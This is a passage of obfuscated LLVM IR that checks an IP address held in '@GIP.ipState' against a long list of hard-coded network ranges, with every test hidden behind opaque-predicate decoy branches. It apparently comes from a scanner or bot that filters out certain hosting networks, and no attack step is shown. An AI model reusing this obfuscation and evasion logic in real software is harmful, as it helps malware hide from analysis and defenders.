  %1999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2000 = zext i8 %1999 to i32
  %2001 = icmp eq i32 %2000, 164
  br i1 %2001, label %2002, label %2026

; <label>:2002:                                   ; preds = %1998
  %2003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2004 = zext i8 %2003 to i32
  %2005 = icmp sge i32 %2004, 217
  br i1 %2005, label %2006, label %2026

; <label>:2006:                                   ; preds = %2002
  %2007 = load i32, i32* @x.65
  %2008 = load i32, i32* @y.66
  %2009 = sub i32 %2007, 1
  %2010 = mul i32 %2007, %2009
  %2011 = urem i32 %2010, 2
  %2012 = icmp eq i32 %2011, 0
  %2013 = icmp slt i32 %2008, 10
  %2014 = or i1 %2012, %2013
  br i1 %2014, label %originalBB278, label %originalBB278alteredBB

originalBB278:                                    ; preds = %originalBB278alteredBB, %2006
  %2015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2016 = zext i8 %2015 to i32
  %2017 = icmp slt i32 %2016, 233
  %2018 = load i32, i32* @x.65
  %2019 = load i32, i32* @y.66
  %2020 = sub i32 %2018, 1
  %2021 = mul i32 %2018, %2020
  %2022 = urem i32 %2021, 2
  %2023 = icmp eq i32 %2022, 0
  %2024 = icmp slt i32 %2019, 10
  %2025 = or i1 %2023, %2024
  br i1 %2025, label %originalBBpart2280, label %originalBB278alteredBB

originalBBpart2280:                               ; preds = %originalBB278
  br i1 %2017, label %5298, label %2026

; <label>:2026:                                   ; preds = %originalBBpart2280, %2002, %1998
  %2027 = load i32, i32* @x.65
  %2028 = load i32, i32* @y.66
  %2029 = sub i32 %2027, 1
  %2030 = mul i32 %2027, %2029
  %2031 = urem i32 %2030, 2
  %2032 = icmp eq i32 %2031, 0
  %2033 = icmp slt i32 %2028, 10
  %2034 = or i1 %2032, %2033
  br i1 %2034, label %originalBB282, label %originalBB282alteredBB

originalBB282:                                    ; preds = %originalBB282alteredBB, %2026
  %2035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = icmp eq i32 %2036, 169
  %2038 = load i32, i32* @x.65
  %2039 = load i32, i32* @y.66
  %2040 = sub i32 %2038, 1
  %2041 = mul i32 %2038, %2040
  %2042 = urem i32 %2041, 2
  %2043 = icmp eq i32 %2042, 0
  %2044 = icmp slt i32 %2039, 10
  %2045 = or i1 %2043, %2044
  br i1 %2045, label %originalBBpart2284, label %originalBB282alteredBB

originalBBpart2284:                               ; preds = %originalBB282
  br i1 %2037, label %2046, label %2054

; <label>:2046:                                   ; preds = %originalBBpart2284
  %2047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2048 = zext i8 %2047 to i32
  %2049 = icmp sge i32 %2048, 252
  br i1 %2049, label %2050, label %2054

; <label>:2050:                                   ; preds = %2046
  %2051 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2052 = zext i8 %2051 to i32
  %2053 = icmp slt i32 %2052, 254
  br i1 %2053, label %5298, label %2054

; <label>:2054:                                   ; preds = %2050, %2046, %originalBBpart2284
  %2055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = icmp eq i32 %2056, 199
  br i1 %2057, label %2058, label %2082

; <label>:2058:                                   ; preds = %2054
  %2059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2060 = zext i8 %2059 to i32
  %2061 = icmp sge i32 %2060, 121
  br i1 %2061, label %2062, label %2082

; <label>:2062:                                   ; preds = %2058
  %2063 = load i32, i32* @x.65
  %2064 = load i32, i32* @y.66
  %2065 = sub i32 %2063, 1
  %2066 = mul i32 %2063, %2065
  %2067 = urem i32 %2066, 2
  %2068 = icmp eq i32 %2067, 0
  %2069 = icmp slt i32 %2064, 10
  %2070 = or i1 %2068, %2069
  br i1 %2070, label %originalBB286, label %originalBB286alteredBB

originalBB286:                                    ; preds = %originalBB286alteredBB, %2062
  %2071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2072 = zext i8 %2071 to i32
  %2073 = icmp slt i32 %2072, 254
  %2074 = load i32, i32* @x.65
  %2075 = load i32, i32* @y.66
  %2076 = sub i32 %2074, 1
  %2077 = mul i32 %2074, %2076
  %2078 = urem i32 %2077, 2
  %2079 = icmp eq i32 %2078, 0
  %2080 = icmp slt i32 %2075, 10
  %2081 = or i1 %2079, %2080
  br i1 %2081, label %originalBBpart2288, label %originalBB286alteredBB

originalBBpart2288:                               ; preds = %originalBB286
  br i1 %2073, label %5298, label %2082

; <label>:2082:                                   ; preds = %originalBBpart2288, %2058, %2054
  %2083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2084 = zext i8 %2083 to i32
  %2085 = icmp eq i32 %2084, 205
  br i1 %2085, label %2086, label %2094

; <label>:2086:                                   ; preds = %2082
  %2087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2088 = zext i8 %2087 to i32
  %2089 = icmp sge i32 %2088, 1
  br i1 %2089, label %2090, label %2094

; <label>:2090:                                   ; preds = %2086
  %2091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2092 = zext i8 %2091 to i32
  %2093 = icmp slt i32 %2092, 118
  br i1 %2093, label %5298, label %2094

; <label>:2094:                                   ; preds = %2090, %2086, %2082
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp eq i32 %2096, 207
  br i1 %2097, label %2098, label %2122

; <label>:2098:                                   ; preds = %2094
  %2099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2100 = zext i8 %2099 to i32
  %2101 = icmp sge i32 %2100, 60
  br i1 %2101, label %2102, label %2122

; <label>:2102:                                   ; preds = %2098
  %2103 = load i32, i32* @x.65
  %2104 = load i32, i32* @y.66
  %2105 = sub i32 %2103, 1
  %2106 = mul i32 %2103, %2105
  %2107 = urem i32 %2106, 2
  %2108 = icmp eq i32 %2107, 0
  %2109 = icmp slt i32 %2104, 10
  %2110 = or i1 %2108, %2109
  br i1 %2110, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2102
  %2111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2112 = zext i8 %2111 to i32
  %2113 = icmp slt i32 %2112, 62
  %2114 = load i32, i32* @x.65
  %2115 = load i32, i32* @y.66
  %2116 = sub i32 %2114, 1
  %2117 = mul i32 %2114, %2116
  %2118 = urem i32 %2117, 2
  %2119 = icmp eq i32 %2118, 0
  %2120 = icmp slt i32 %2115, 10
  %2121 = or i1 %2119, %2120
  br i1 %2121, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  br i1 %2113, label %5298, label %2122

; <label>:2122:                                   ; preds = %originalBBpart2292, %2098, %2094
  %2123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2124 = zext i8 %2123 to i32
  %2125 = icmp eq i32 %2124, 104
  br i1 %2125, label %2126, label %2134

; <label>:2126:                                   ; preds = %2122
  %2127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2128 = zext i8 %2127 to i32
  %2129 = icmp sge i32 %2128, 16
  br i1 %2129, label %2130, label %2134

; <label>:2130:                                   ; preds = %2126
  %2131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2132 = zext i8 %2131 to i32
  %2133 = icmp slt i32 %2132, 31
  br i1 %2133, label %5298, label %2134

; <label>:2134:                                   ; preds = %2130, %2126, %2122
  %2135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2136 = zext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 188
  br i1 %2137, label %2138, label %2142

; <label>:2138:                                   ; preds = %2134
  %2139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2140 = zext i8 %2139 to i32
  %2141 = icmp eq i32 %2140, 166
  br i1 %2141, label %5298, label %2142

; <label>:2142:                                   ; preds = %2138, %2134
  %2143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2144 = zext i8 %2143 to i32
  %2145 = icmp eq i32 %2144, 188
  br i1 %2145, label %2146, label %2150

; <label>:2146:                                   ; preds = %2142
  %2147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2148 = zext i8 %2147 to i32
  %2149 = icmp eq i32 %2148, 226
  br i1 %2149, label %5298, label %2150

; <label>:2150:                                   ; preds = %2146, %2142
  %2151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2152 = zext i8 %2151 to i32
  %2153 = icmp eq i32 %2152, 159
  br i1 %2153, label %2154, label %2158

; <label>:2154:                                   ; preds = %2150
  %2155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2156 = zext i8 %2155 to i32
  %2157 = icmp eq i32 %2156, 203
  br i1 %2157, label %5298, label %2158

; <label>:2158:                                   ; preds = %2154, %2150
  %2159 = load i32, i32* @x.65
  %2160 = load i32, i32* @y.66
  %2161 = sub i32 %2159, 1
  %2162 = mul i32 %2159, %2161
  %2163 = urem i32 %2162, 2
  %2164 = icmp eq i32 %2163, 0
  %2165 = icmp slt i32 %2160, 10
  %2166 = or i1 %2164, %2165
  br i1 %2166, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %2158
  %2167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2168 = zext i8 %2167 to i32
  %2169 = icmp eq i32 %2168, 162
  %2170 = load i32, i32* @x.65
  %2171 = load i32, i32* @y.66
  %2172 = sub i32 %2170, 1
  %2173 = mul i32 %2170, %2172
  %2174 = urem i32 %2173, 2
  %2175 = icmp eq i32 %2174, 0
  %2176 = icmp slt i32 %2171, 10
  %2177 = or i1 %2175, %2176
  br i1 %2177, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br i1 %2169, label %2178, label %2182

; <label>:2178:                                   ; preds = %originalBBpart2296
  %2179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2180 = zext i8 %2179 to i32
  %2181 = icmp eq i32 %2180, 243
  br i1 %2181, label %5298, label %2182

; <label>:2182:                                   ; preds = %2178, %originalBBpart2296
  %2183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2184 = zext i8 %2183 to i32
  %2185 = icmp eq i32 %2184, 45
  br i1 %2185, label %2186, label %2190

; <label>:2186:                                   ; preds = %2182
  %2187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2188 = zext i8 %2187 to i32
  %2189 = icmp eq i32 %2188, 55
  br i1 %2189, label %5298, label %2190

; <label>:2190:                                   ; preds = %2186, %2182
  %2191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2192 = zext i8 %2191 to i32
  %2193 = icmp eq i32 %2192, 178
  br i1 %2193, label %2194, label %2198

; <label>:2194:                                   ; preds = %2190
  %2195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = icmp eq i32 %2196, 62
  br i1 %2197, label %5298, label %2198

; <label>:2198:                                   ; preds = %2194, %2190
  %2199 = load i32, i32* @x.65
  %2200 = load i32, i32* @y.66
  %2201 = sub i32 %2199, 1
  %2202 = mul i32 %2199, %2201
  %2203 = urem i32 %2202, 2
  %2204 = icmp eq i32 %2203, 0
  %2205 = icmp slt i32 %2200, 10
  %2206 = or i1 %2204, %2205
  br i1 %2206, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %2198
  %2207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2208 = zext i8 %2207 to i32
  %2209 = icmp eq i32 %2208, 104
  %2210 = load i32, i32* @x.65
  %2211 = load i32, i32* @y.66
  %2212 = sub i32 %2210, 1
  %2213 = mul i32 %2210, %2212
  %2214 = urem i32 %2213, 2
  %2215 = icmp eq i32 %2214, 0
  %2216 = icmp slt i32 %2211, 10
  %2217 = or i1 %2215, %2216
  br i1 %2217, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %2209, label %2218, label %2222

; <label>:2218:                                   ; preds = %originalBBpart2300
  %2219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2220 = zext i8 %2219 to i32
  %2221 = icmp eq i32 %2220, 131
  br i1 %2221, label %5298, label %2222

; <label>:2222:                                   ; preds = %2218, %originalBBpart2300
  %2223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2224 = zext i8 %2223 to i32
  %2225 = icmp eq i32 %2224, 104
  br i1 %2225, label %2226, label %2246

; <label>:2226:                                   ; preds = %2222
  %2227 = load i32, i32* @x.65
  %2228 = load i32, i32* @y.66
  %2229 = sub i32 %2227, 1
  %2230 = mul i32 %2227, %2229
  %2231 = urem i32 %2230, 2
  %2232 = icmp eq i32 %2231, 0
  %2233 = icmp slt i32 %2228, 10
  %2234 = or i1 %2232, %2233
  br i1 %2234, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2226
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 236
  %2238 = load i32, i32* @x.65
  %2239 = load i32, i32* @y.66
  %2240 = sub i32 %2238, 1
  %2241 = mul i32 %2238, %2240
  %2242 = urem i32 %2241, 2
  %2243 = icmp eq i32 %2242, 0
  %2244 = icmp slt i32 %2239, 10
  %2245 = or i1 %2243, %2244
  br i1 %2245, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br i1 %2237, label %5298, label %2246

; <label>:2246:                                   ; preds = %originalBBpart2304, %2222
  %2247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2248 = zext i8 %2247 to i32
  %2249 = icmp eq i32 %2248, 107
  br i1 %2249, label %2250, label %2254

; <label>:2250:                                   ; preds = %2246
  %2251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2252 = zext i8 %2251 to i32
  %2253 = icmp eq i32 %2252, 170
  br i1 %2253, label %5298, label %2254

; <label>:2254:                                   ; preds = %2250, %2246
  %2255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2256 = zext i8 %2255 to i32
  %2257 = icmp eq i32 %2256, 138
  br i1 %2257, label %2258, label %2262

; <label>:2258:                                   ; preds = %2254
  %2259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2260 = zext i8 %2259 to i32
  %2261 = icmp eq i32 %2260, 197
  br i1 %2261, label %5298, label %2262

; <label>:2262:                                   ; preds = %2258, %2254
  %2263 = load i32, i32* @x.65
  %2264 = load i32, i32* @y.66
  %2265 = sub i32 %2263, 1
  %2266 = mul i32 %2263, %2265
  %2267 = urem i32 %2266, 2
  %2268 = icmp eq i32 %2267, 0
  %2269 = icmp slt i32 %2264, 10
  %2270 = or i1 %2268, %2269
  br i1 %2270, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2262
  %2271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2272 = zext i8 %2271 to i32
  %2273 = icmp eq i32 %2272, 138
  %2274 = load i32, i32* @x.65
  %2275 = load i32, i32* @y.66
  %2276 = sub i32 %2274, 1
  %2277 = mul i32 %2274, %2276
  %2278 = urem i32 %2277, 2
  %2279 = icmp eq i32 %2278, 0
  %2280 = icmp slt i32 %2275, 10
  %2281 = or i1 %2279, %2280
  br i1 %2281, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br i1 %2273, label %2282, label %2286

; <label>:2282:                                   ; preds = %originalBBpart2308
  %2283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2284 = zext i8 %2283 to i32
  %2285 = icmp eq i32 %2284, 68
  br i1 %2285, label %5298, label %2286

; <label>:2286:                                   ; preds = %2282, %originalBBpart2308
  %2287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2288 = zext i8 %2287 to i32
  %2289 = icmp eq i32 %2288, 139
  br i1 %2289, label %2290, label %2294

; <label>:2290:                                   ; preds = %2286
  %2291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2292 = zext i8 %2291 to i32
  %2293 = icmp eq i32 %2292, 59
  br i1 %2293, label %5298, label %2294

; <label>:2294:                                   ; preds = %2290, %2286
  %2295 = load i32, i32* @x.65
  %2296 = load i32, i32* @y.66
  %2297 = sub i32 %2295, 1
  %2298 = mul i32 %2295, %2297
  %2299 = urem i32 %2298, 2
  %2300 = icmp eq i32 %2299, 0
  %2301 = icmp slt i32 %2296, 10
  %2302 = or i1 %2300, %2301
  br i1 %2302, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2294
  %2303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2304 = zext i8 %2303 to i32
  %2305 = icmp eq i32 %2304, 146
  %2306 = load i32, i32* @x.65
  %2307 = load i32, i32* @y.66
  %2308 = sub i32 %2306, 1
  %2309 = mul i32 %2306, %2308
  %2310 = urem i32 %2309, 2
  %2311 = icmp eq i32 %2310, 0
  %2312 = icmp slt i32 %2307, 10
  %2313 = or i1 %2311, %2312
  br i1 %2313, label %originalBBpart2312, label %originalBB310alteredBB

originalBBpart2312:                               ; preds = %originalBB310
  br i1 %2305, label %2314, label %2358

; <label>:2314:                                   ; preds = %originalBBpart2312
  %2315 = load i32, i32* @x.65
  %2316 = load i32, i32* @y.66
  %2317 = sub i32 %2315, 1
  %2318 = mul i32 %2315, %2317
  %2319 = urem i32 %2318, 2
  %2320 = icmp eq i32 %2319, 0
  %2321 = icmp slt i32 %2316, 10
  %2322 = or i1 %2320, %2321
  br i1 %2322, label %originalBB314, label %originalBB314alteredBB

originalBB314:                                    ; preds = %originalBB314alteredBB, %2314
  %2323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2324 = zext i8 %2323 to i32
  %2325 = icmp eq i32 %2324, 185
  %2326 = load i32, i32* @x.65
  %2327 = load i32, i32* @y.66
  %2328 = sub i32 %2326, 1
  %2329 = mul i32 %2326, %2328
  %2330 = urem i32 %2329, 2
  %2331 = icmp eq i32 %2330, 0
  %2332 = icmp slt i32 %2327, 10
  %2333 = or i1 %2331, %2332
  br i1 %2333, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br i1 %2325, label %2334, label %2358

; <label>:2334:                                   ; preds = %originalBBpart2316
  %2335 = load i32, i32* @x.65
  %2336 = load i32, i32* @y.66
  %2337 = sub i32 %2335, 1
  %2338 = mul i32 %2335, %2337
  %2339 = urem i32 %2338, 2
  %2340 = icmp eq i32 %2339, 0
  %2341 = icmp slt i32 %2336, 10
  %2342 = or i1 %2340, %2341
  br i1 %2342, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2334
  %2343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2344 = zext i8 %2343 to i32
  %2345 = icmp sge i32 %2344, 128
  %2346 = load i32, i32* @x.65
  %2347 = load i32, i32* @y.66
  %2348 = sub i32 %2346, 1
  %2349 = mul i32 %2346, %2348
  %2350 = urem i32 %2349, 2
  %2351 = icmp eq i32 %2350, 0
  %2352 = icmp slt i32 %2347, 10
  %2353 = or i1 %2351, %2352
  br i1 %2353, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br i1 %2345, label %2354, label %2358

; <label>:2354:                                   ; preds = %originalBBpart2320
  %2355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2356 = zext i8 %2355 to i32
  %2357 = icmp slt i32 %2356, 191
  br i1 %2357, label %5298, label %2358

; <label>:2358:                                   ; preds = %2354, %originalBBpart2320, %originalBBpart2316, %originalBBpart2312
  %2359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2360 = zext i8 %2359 to i32
  %2361 = icmp eq i32 %2360, 163
  br i1 %2361, label %2362, label %2374

; <label>:2362:                                   ; preds = %2358
  %2363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2364 = zext i8 %2363 to i32
  %2365 = icmp eq i32 %2364, 47
  br i1 %2365, label %2366, label %2374

; <label>:2366:                                   ; preds = %2362
  %2367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2368 = zext i8 %2367 to i32
  %2369 = icmp sge i32 %2368, 10
  br i1 %2369, label %2370, label %2374

; <label>:2370:                                   ; preds = %2366
  %2371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2372 = zext i8 %2371 to i32
  %2373 = icmp slt i32 %2372, 11
  br i1 %2373, label %5298, label %2374

; <label>:2374:                                   ; preds = %2370, %2366, %2362, %2358
  %2375 = load i32, i32* @x.65
  %2376 = load i32, i32* @y.66
  %2377 = sub i32 %2375, 1
  %2378 = mul i32 %2375, %2377
  %2379 = urem i32 %2378, 2
  %2380 = icmp eq i32 %2379, 0
  %2381 = icmp slt i32 %2376, 10
  %2382 = or i1 %2380, %2381
  br i1 %2382, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2374
  %2383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2384 = zext i8 %2383 to i32
  %2385 = icmp eq i32 %2384, 174
  %2386 = load i32, i32* @x.65
  %2387 = load i32, i32* @y.66
  %2388 = sub i32 %2386, 1
  %2389 = mul i32 %2386, %2388
  %2390 = urem i32 %2389, 2
  %2391 = icmp eq i32 %2390, 0
  %2392 = icmp slt i32 %2387, 10
  %2393 = or i1 %2391, %2392
  br i1 %2393, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br i1 %2385, label %2394, label %2422

; <label>:2394:                                   ; preds = %originalBBpart2324
  %2395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2396 = zext i8 %2395 to i32
  %2397 = icmp eq i32 %2396, 138
  br i1 %2397, label %2398, label %2422

; <label>:2398:                                   ; preds = %2394
  %2399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2400 = zext i8 %2399 to i32
  %2401 = icmp sge i32 %2400, 1
  br i1 %2401, label %2402, label %2422

; <label>:2402:                                   ; preds = %2398
  %2403 = load i32, i32* @x.65
  %2404 = load i32, i32* @y.66
  %2405 = sub i32 %2403, 1
  %2406 = mul i32 %2403, %2405
  %2407 = urem i32 %2406, 2
  %2408 = icmp eq i32 %2407, 0
  %2409 = icmp slt i32 %2404, 10
  %2410 = or i1 %2408, %2409
  br i1 %2410, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2402
  %2411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2412 = zext i8 %2411 to i32
  %2413 = icmp slt i32 %2412, 127
  %2414 = load i32, i32* @x.65
  %2415 = load i32, i32* @y.66
  %2416 = sub i32 %2414, 1
  %2417 = mul i32 %2414, %2416
  %2418 = urem i32 %2417, 2
  %2419 = icmp eq i32 %2418, 0
  %2420 = icmp slt i32 %2415, 10
  %2421 = or i1 %2419, %2420
  br i1 %2421, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br i1 %2413, label %5298, label %2422

; <label>:2422:                                   ; preds = %originalBBpart2328, %2398, %2394, %originalBBpart2324
  %2423 = load i32, i32* @x.65
  %2424 = load i32, i32* @y.66
  %2425 = sub i32 %2423, 1
  %2426 = mul i32 %2423, %2425
  %2427 = urem i32 %2426, 2
  %2428 = icmp eq i32 %2427, 0
  %2429 = icmp slt i32 %2424, 10
  %2430 = or i1 %2428, %2429
  br i1 %2430, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2422
  %2431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2432 = zext i8 %2431 to i32
  %2433 = icmp eq i32 %2432, 192
  %2434 = load i32, i32* @x.65
  %2435 = load i32, i32* @y.66
  %2436 = sub i32 %2434, 1
  %2437 = mul i32 %2434, %2436
  %2438 = urem i32 %2437, 2
  %2439 = icmp eq i32 %2438, 0
  %2440 = icmp slt i32 %2435, 10
  %2441 = or i1 %2439, %2440
  br i1 %2441, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %2433, label %2442, label %2454

; <label>:2442:                                   ; preds = %originalBBpart2332
  %2443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2444 = zext i8 %2443 to i32
  %2445 = icmp eq i32 %2444, 241
  br i1 %2445, label %2446, label %2454

; <label>:2446:                                   ; preds = %2442
  %2447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2448 = zext i8 %2447 to i32
  %2449 = icmp sge i32 %2448, 128
  br i1 %2449, label %2450, label %2454

; <label>:2450:                                   ; preds = %2446
  %2451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2452 = zext i8 %2451 to i32
  %2453 = icmp slt i32 %2452, 255
  br i1 %2453, label %5298, label %2454

; <label>:2454:                                   ; preds = %2450, %2446, %2442, %originalBBpart2332
  %2455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2456 = zext i8 %2455 to i32
  %2457 = icmp eq i32 %2456, 198
  br i1 %2457, label %2458, label %2486

; <label>:2458:                                   ; preds = %2454
  %2459 = load i32, i32* @x.65
  %2460 = load i32, i32* @y.66
  %2461 = sub i32 %2459, 1
  %2462 = mul i32 %2459, %2461
  %2463 = urem i32 %2462, 2
  %2464 = icmp eq i32 %2463, 0
  %2465 = icmp slt i32 %2460, 10
  %2466 = or i1 %2464, %2465
  br i1 %2466, label %originalBB334, label %originalBB334alteredBB

originalBB334:                                    ; preds = %originalBB334alteredBB, %2458
  %2467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2468 = zext i8 %2467 to i32
  %2469 = icmp eq i32 %2468, 199
  %2470 = load i32, i32* @x.65
  %2471 = load i32, i32* @y.66
  %2472 = sub i32 %2470, 1
  %2473 = mul i32 %2470, %2472
  %2474 = urem i32 %2473, 2
  %2475 = icmp eq i32 %2474, 0
  %2476 = icmp slt i32 %2471, 10
  %2477 = or i1 %2475, %2476
  br i1 %2477, label %originalBBpart2336, label %originalBB334alteredBB

originalBBpart2336:                               ; preds = %originalBB334
  br i1 %2469, label %2478, label %2486

; <label>:2478:                                   ; preds = %originalBBpart2336
